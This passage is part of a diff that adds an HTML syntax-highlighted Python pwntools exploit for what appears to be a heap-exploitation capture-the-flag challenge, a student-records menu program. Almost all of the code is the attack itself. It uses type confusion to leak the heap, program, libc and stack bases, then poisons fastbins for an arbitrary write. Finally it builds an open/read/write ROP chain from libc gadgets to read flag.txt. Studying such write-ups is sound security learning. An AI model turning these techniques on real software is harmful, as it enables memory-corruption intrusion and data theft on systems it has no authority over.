+    </span><span style="color:#ccc9c2;">fake_student </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;AAAAAAAA&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(program_base </span><span style="color:#f29e74;">+ </span><span style="color:#ccc9c2;">got_malloc_offset) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span style="color:#ccc9c2;">([</span><span style="font-style:italic;color:#5ccfe6;">str</span><span style="color:#ccc9c2;">(fake_student[x])</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">() </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2;">)]))
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;2 0&quot;</span><span style="color:#ccc9c2;">)
+
+
+    malloc_addr </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span style="color:#ccc9c2;">(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">6</span><span style="color:#ccc9c2;">)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span style="color:#ccc9c2;">()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">))
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">malloc_addr </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x97140 </span><span style="font-style:italic;color:#5c6773;"># offset of malloc from libc base
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_stack_base</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">libc_base</span><span style="color:#ccc9c2;">):
+
+    </span><span style="font-style:italic;color:#5c6773;"># libc has a variable &quot;environ&quot; which stores a stack address
+    # since we know libc base, we can just yoink that
+
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 0 0&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 1 0&quot;</span><span style="color:#ccc9c2;">) 
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 0&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 1 24&quot;</span><span style="color:#ccc9c2;">)
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># 0x3ee098 is environ address
+    </span><span style="color:#ccc9c2;">fake_student </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;AAAAAAAA&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x3ee098</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span style="color:#ccc9c2;">([</span><span style="font-style:italic;color:#5ccfe6;">str</span><span style="color:#ccc9c2;">(fake_student[x])</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">() </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2;">)]))
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;2 0&quot;</span><span style="color:#ccc9c2;">)
+
+
+    env_addr </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span style="color:#ccc9c2;">(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">6</span><span style="color:#ccc9c2;">)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span style="color:#ccc9c2;">()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">))
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    
+    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">env_addr </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x130 </span><span style="font-style:italic;color:#5c6773;"># -0x130 is the offset from environ to the set_name stored rip
+
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">poison_fastbin</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">target</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">value</span><span style="color:#ccc9c2;">):
+
+    </span><span style="color:#ffa759;">assert</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">len</span><span style="color:#ccc9c2;">(value) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2;">)
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># first we empty tcache
+
+    </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">9</span><span style="color:#ccc9c2;">):
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;0 </span><span style="color:#ccc9c2;">{i}</span><span style="color:#bae67e;"> 0&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">())
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2;">):
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;4 </span><span style="color:#ccc9c2;">{</span><span style="color:#ffcc66;">2</span><span style="color:#f29e74;">+</span><span style="color:#ccc9c2;">i}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">())
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    </span><span style="font-style:italic;color:#5c6773;"># # now, to populate fastbins with a dupe
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 0&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 1&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4 0&quot;</span><span style="color:#ccc9c2;">)
+
+    </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2;">):
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    </span><span style="font-style:italic;color:#5c6773;"># # lets just empty tcache real quick
+
+    </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">7</span><span style="color:#ccc9c2;">):
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;0 3 0&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">())
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 0 24&quot;</span><span style="color:#ccc9c2;">)
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># we have a duplicate chunk in fastbin
+    # so what we want to do is write over the next pointer
+    # allowing us to artificially extend fastbin
+    # and tricking malloc into returning an arbitrary pointer
+
+    </span><span style="color:#ccc9c2;">dup_chunk </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(target) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">16
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span style="color:#ccc9c2;">([</span><span style="font-style:italic;color:#5ccfe6;">str</span><span style="color:#ccc9c2;">(dup_chunk[x])</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">() </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2;">)]))
+
+    </span><span style="font-style:italic;color:#5c6773;"># here we use up the rest of real fastbin so the next pointer is our fake pointer
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 0 0&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 0 0&quot;</span><span style="color:#ccc9c2;">)
+
+    </span><span style="font-style:italic;color:#5c6773;"># allocate our fake pointer and write &quot;value&quot; to it
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span style="color:#ccc9c2;">(MENU_DELIM</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 0 24&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span style="color:#ccc9c2;">([</span><span style="font-style:italic;color:#5ccfe6;">str</span><span style="color:#ccc9c2;">(value[x])</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">() </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">24</span><span style="color:#ccc9c2;">)]))
+
+    </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2;">):
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">():
+    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">()
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(MENU_DELIM)
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># first, leak useful info
+    # arbitrary read by way of type confusion
+    # essentially we allocate and free a student
+    # and then allocate a name of same size
+    # these will share an address
+    # and so we can construct a fake student
+    # by controlling the name pointer in the student struct
+    # we can read whatever we want
+
+    </span><span style="color:#ccc9c2;">heap_base </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_heap</span><span style="color:#ccc9c2;">(r)
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;heap base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(heap_base))
+
+    program_base </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_program_base</span><span style="color:#ccc9c2;">(r)
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;program base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(program_base))
+
+    libc_base </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_libc_base</span><span style="color:#ccc9c2;">(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">program_base)
+
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;libc base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(libc_base))
+
+    stack_ret </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_stack_base</span><span style="color:#ccc9c2;">(r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">libc_base)
+
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;stored RIP: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(stack_ret))
+
+    </span><span style="font-style:italic;color:#5c6773;"># all gadgets are from libc for convenience
+
+    </span><span style="color:#ccc9c2;">pop_rax </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x43ae8
+    </span><span style="color:#ccc9c2;">pop_rdi </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x215bf
+    </span><span style="color:#ccc9c2;">pop_rsi </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x23eea
+    </span><span style="color:#ccc9c2;">pop_rdx </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x1b96
+    </span><span style="color:#ccc9c2;">syscall_ret </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0xd2745
+    </span><span style="color:#ccc9c2;">pop_rsp </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x3960
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># heap addresses are predictable and if you allocate in the same pattern
+    # you can just reuse offsets
+
+    </span><span style="color:#ccc9c2;">flag_heap_addr </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">heap_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x13630
+    </span><span style="color:#ccc9c2;">heap_rop_address </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">heap_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x12dd0
+
+    </span><span style="font-style:italic;color:#5c6773;"># find a nice empty chunk in rw program memory for the flag
+    </span><span style="color:#ccc9c2;">flag_read_address </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">program_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x203048
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># open/read/write syscall chain
+
+    </span><span style="color:#ccc9c2;">chain </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
+    </span><span style="color:#ccc9c2;">chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rax) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(flag_heap_addr)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdx) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(syscall_ret)
+
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rax) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(flag_read_address)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdx) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">64</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(syscall_ret)
+
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rax) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(flag_read_address)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdx) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">64</span><span style="color:#ccc9c2;">)
+    chain </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(syscall_ret)
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># put rop chain and &quot;flag.txt&quot; on heap
+    # addresses are calculated in advance bc it&#39;s predictable
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 15 0&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 15 500&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span style="color:#ccc9c2;">([</span><span style="font-style:italic;color:#5ccfe6;">str</span><span style="color:#ccc9c2;">(x)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">() </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in </span><span style="color:#ccc9c2;">chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">500</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)]))
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;0 14 0&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1 14 500&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span style="color:#ccc9c2;">([</span><span style="font-style:italic;color:#5ccfe6;">str</span><span style="color:#ccc9c2;">(x)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">() </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">x </span><span style="color:#ffa759;">in b</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">500</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)]))
+
+    </span><span style="color:#ffa759;">for </span><span style="color:#ccc9c2;">i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2;">):
+        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;choice: </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
